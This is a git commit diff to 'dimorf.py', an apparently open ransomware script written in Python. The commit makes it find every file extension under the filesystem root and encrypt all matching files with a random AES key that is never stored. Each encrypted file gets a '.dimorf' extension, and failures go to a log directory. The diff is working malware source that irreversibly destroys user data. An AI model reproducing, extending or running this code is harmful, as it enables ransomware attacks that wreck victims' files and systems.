dce986dc64e9f9ffd5d217da6fe4fa2b2a1b9f8e
Wendel Ortiz <wsortiz@outlook.com>
2023-03-31 15:19:20 -0300

    updated logs and getting file extensions in path

--- dimorf.py
+++ dimorf.py
@@ -11,21 +11,67 @@ __module__ = 'dimorf.py'
 
 import sys
 import os
+import logging
+from datetime import datetime as dt
 from psutil import process_iter
 from time import sleep
 from Crypto.Cipher import AES
 from Crypto import Random
 
 
-def check_os(osname: str) -> bool:
-    """ Check if the specified operating system is supported.
+def __save_log_error(dir_log: str, logs: list) -> str:
+    """ Logs error messages to a file and returns the path of the log file.
 
     Args:
-    osname -- the name of the operating system (string)
+        dir_log (str): The directory where the log file should be saved.
+        logs (list): A list of error messages to be logged.
 
     Returns:
-    True if the operating system is supported, False otherwise (boolean)
+        str: The path of the log file.
 
+    Raises:
+        OSError: If there's an error creating the log directory.
+        Exception: If there's an error during the logging process.
+        
+    """
+    try:
+        if (
+            not (
+                os.path.isdir(
+                    dir_log
+                )
+            )
+        ):
+            os.mkdir(
+                dir_log
+            )
+            
+        logging.basicConfig(
+            level=logging.INFO,
+            filename=f'{dir_log}/{dt.now():%Y-%m-%d}.log',
+            format='%(asctime)s - %(levelname)s - %(message)s',
+            encoding='utf-8'
+        )
+
+        for line in logs:
+            logging.error(
+                line
+            )
+        
+        return (
+            f'\33[32mLogs generated in -> \33[31m{dir_log}/{dt.now():%Y-%m-%d}.log\33[0m'
+        )
+    
+    except Exception as e:
+        raise e
+
+
+def check_os(osname: str) -> bool:
+    """ Check if the specified operating system is supported.
+    Args:
+    osname -- the name of the operating system (string)
+    Returns:
+    True if the operating system is supported, False otherwise (boolean)
     Raises:
     This function may raise a SystemExit exception if the Python version is not supported.
     """
@@ -35,35 +81,54 @@ def check_os(osname: str) -> bool:
     if (os.getuid() == 0):
         PATH = '/'
     
+    
     # # check if os is linux.
     is_linux = [
-        prop for prop in os.uname() if (
-            (prop == "Linux")
-        ) and ((sys.platform == "linux")) and (
-            (os.name == osname)
-        )
+        prop for prop in os.uname() if ((prop == "Linux")) and (
+            (sys.platform == "linux")) and (
+                (os.name == osname))
     ]
 
-    # # check python version before called function.
-    if ((is_linux) and (
-        sys.version[0] == '3')
-    ):
-        find_and_encrypt(
-            path=PATH,
-            ext_files=['.txt', '.sh'],
-            cd=['/bin', '/sbin', '/etc', '/lib', '/usr/lib', '/boot'],
-            hidden='.',
-            new_ext='.dimorf',
-            key=Random.get_random_bytes(32),
-            block_bytes=65536
+    exts = set()
+    
+    # # get all files extensions from path
+    for root, dirs, files in os.walk(PATH):
+        for file in files:
+            ext = os.path.splitext(file)[1]
+            exts.add(ext)
+    
+    # # sort array        
+    exts_list = sorted(
+        list(
+            exts
         )
-        
-        return True
-    
-    else:
-        sys.exit(f'\33[31mUnsupported python version {sys.version_info}, upgrade to python3.\33[0m')
-    
+    )
 
+    try:
+        # # check python version before called function.
+        if ((is_linux) and (
+            sys.version[0] == '3')
+        ):
+            find_and_encrypt(
+                path=PATH,
+                ext_files=exts_list,
+                cd=['/bin', '/sbin', '/etc', '/lib', '/usr/lib', '/boot'],
+                hidden='.',
+                new_ext='.dimorf',
+                key=Random.get_random_bytes(32),
+                block_bytes=65536,
+            )
+            
+            return True
+        
+        else:
+            return False
+    except SystemError:
+        sys.exit(
+            f'\33[31mUnsupported python version {sys.version_info}, upgrade to python3.\33[0m'
+        )
+    
+    
 def find_and_encrypt(
     path: str,
     ext_files: list,
@@ -85,7 +150,10 @@ def find_and_encrypt(
         hidden (str): A string containing the name of files to be hidden.
         new_ext (str): A string with the new extension to be added to the encrypted files.
         key (bytes): The encryption key as bytes.
-        block_bytes (int): The size of the block in bytes that the file will be read in, and also the size of the encryption block.
+        block_bytes (int): 
+            The size of the block in bytes that the file will be read in, 
+            and also the size of the encryption block.
+            
     """
 
     # # go in search of the file.
@@ -283,24 +351,19 @@ def find_and_encrypt(
                             # # generates a log file with the files
                             # # that could not be assigned permission.
                             sleep(2)
-                            logs = [
-                                ('Error changing file permissions\n'),
-                                (f'Files not encrypted by unauthorized operations. => {os.path.join(root, file)}\n')
-                            ]
-
-                            with open('log_dimorf.log', mode='w') as lf:
-                                if lf.write(
-                                    logs [
-                                        0
-                                    ]
-                                ):
-                                    lf.write(
-                                        logs [
-                                            1
-                                        ]
-                                    )
-                                    print(f'\33[32mLogs generated in -> {lf}\33[0m')
                             
+                            # # print to get return of logging function 
+                            print(
+                                __save_log_error(
+                                    dir_log='./log_dimorf',
+                                    logs=[
+                                        ('Error changing file permissions\n'),
+                                        (f'Files not encrypted by unauthorized operations. => {os.path.join(root, file)}\n')
+                                    ]
+                                )
+                            )
+                                
+                
 if __name__ == '__main__':
     os.system('clear')        
     check_os('posix')
